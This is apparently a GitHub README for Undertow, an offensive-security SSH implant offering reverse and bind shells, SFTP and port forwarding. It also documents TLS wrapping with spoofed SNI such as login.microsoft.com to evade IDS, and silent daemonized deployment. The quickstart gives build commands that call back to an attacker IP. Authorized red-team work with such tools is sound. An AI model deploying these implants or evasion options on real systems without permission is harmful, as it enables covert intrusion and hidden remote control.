<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Undertow/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Undertow/main/docs/assets/logo-light.svg">
  <img alt="Undertow" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Undertow/main/docs/assets/logo-dark.svg" width="100%">
</picture>

> [!IMPORTANT]
> **Statically-linked SSH server for penetration testing — under 1.5MB.** Reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding in a single static binary. Optional TLS wrapping hides SSH inside HTTPS to evade DPI/IDS on the wire. Go predecessor to [Neap](https://github.com/Real-Fruit-Snacks/Neap).

> *An undertow is a current flowing beneath the surface in the opposite direction from what's visible above. Felt fitting for a tool that hides SSH traffic inside TLS — appearing as HTTPS on the wire while the session flows underneath.*

---

## §1 / Premise

Undertow is a **statically-linked SSH server** for penetration testing. It provides reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding in a single Go binary under 1.5MB. `CGO_ENABLED=0` cross-compilation means the binary runs anywhere with no runtime dependencies — drop it, run it, SSH in.

Reverse mode dials home through firewalls. Bind mode listens on the target. Both support full PTY (openpty on Linux, ConPTY on Windows), SFTP, and port forwarding identically. The build script auto-generates a handler that starts the listener, displays credentials, and shows the SSH command when a callback arrives.

TLS wrapping is optional and transparent — wraps SSH inside TLS with ALPN negotiation and SNI spoofing so the SSH banner never appears in plaintext on the wire. Auto-daemonize detaches from the shell on deployment (`-d` flag or baked in at build time with `--daemonize`), freeing the session from evil-winrm, WMI, or similar execution contexts.

**Authorization Required**: Designed exclusively for authorized security testing with explicit written permission.

---

## §2 / Specs

| KEY        | VALUE                                                                       |
|------------|-----------------------------------------------------------------------------|
| SIZE       | **<1.5MB static** · CGO_ENABLED=0 · no runtime dependencies                |
| SHELLS     | **Reverse + bind** · PTY support (Linux openpty / Windows ConPTY)           |
| TRANSPORT  | **TLS wrapping** · ALPN negotiation · SNI spoofing · SSH over HTTPS         |
| SFTP       | **Built-in subsystem** · upload/download through the SSH connection         |
| FORWARDING | **Local · remote · dynamic** · SOCKS proxy · SSH tunnel capabilities        |
| DAEMONIZE  | **Auto-detach** · runtime flag (-d) · build-time bake-in (--daemonize)     |
| STACK      | **Go 1.15+** · CGO_ENABLED=0 · static · GPLv3                              |

Architecture in §4 below.

---

## §3 / Quickstart

**Prerequisites:** Go 1.15+, Make

```bash
git clone https://github.com/Real-Fruit-Snacks/Undertow.git
cd Undertow
```

**Reverse shell:**

```bash
./build.sh reverse 192.168.1.10:4444
./bin/handler-192-168-1-10-4444    # start handler — shows SSH command on callback
```

**Bind shell:**

```bash
./build.sh listen 8888
ssh -p 8888 svc@TARGET_IP          # connect from attacker
```

**With TLS:**

```bash
./build.sh reverse 10.10.14.5:443 --tls --sni login.microsoft.com
./build.sh listen 8888 --tls --sni google.com
```

**Silent deployment (no CLI, auto-backgrounds):**

```bash
./build.sh reverse 10.10.14.5:443 --nocli --daemonize
```

---

## §4 / Architecture

```
Undertow/
├── main.go                 Entry point, mode selection
├── core.go                 SSH server configuration, key generation
├── ssh_session.go          Session handling, PTY, SFTP
├── ssh_session_unix.go     Linux PTY via creack/pty
├── ssh_session_windows.go  Windows ConPTY
├── detach_windows.go       Background mode (DETACHED_PROCESS)
├── detach_unix.go          Background mode (setsid)
├── build.sh                Build script with handler generation
└── Makefile
```

| Layer        | Implementation                                                  |
|--------------|-----------------------------------------------------------------|
| **Modes**    | Bind (server listens) · reverse (client dials home)             |
| **Session**  | SSH-2.0 · PTY shells · SFTP subsystem · port forwarding         |
| **Transport**| Optional TLS · ALPN negotiation · SNI spoofing                  |
| **Daemonize**| Unix setsid · Windows DETACHED_PROCESS + CREATE_NO_WINDOW       |
| **Build**    | CGO_ENABLED=0 · static · optional UPX compression              |

Single static binary. Under 1.5MB for Linux. Optional UPX compression via `--compress`. The build script generates a handler script alongside the binary with embedded credentials and connection details.

---

## §5 / Platform Support

| Capability | Linux | Windows |
|------------|-------|---------|
| Reverse shell | Full (PTY) | Full (ConPTY) |
| Bind shell | Full | Full |
| SFTP | Full | Full |
| Port forwarding | Full | Full |
| TLS wrapping | Full | Full |
| Auto-daemonize | Full (setsid) | Full (DETACHED_PROCESS) |

---

[License: GPLv3](LICENSE) · Part of [Real-Fruit-Snacks](https://github.com/Real-Fruit-Snacks) — building offensive security tools, one wave at a time.
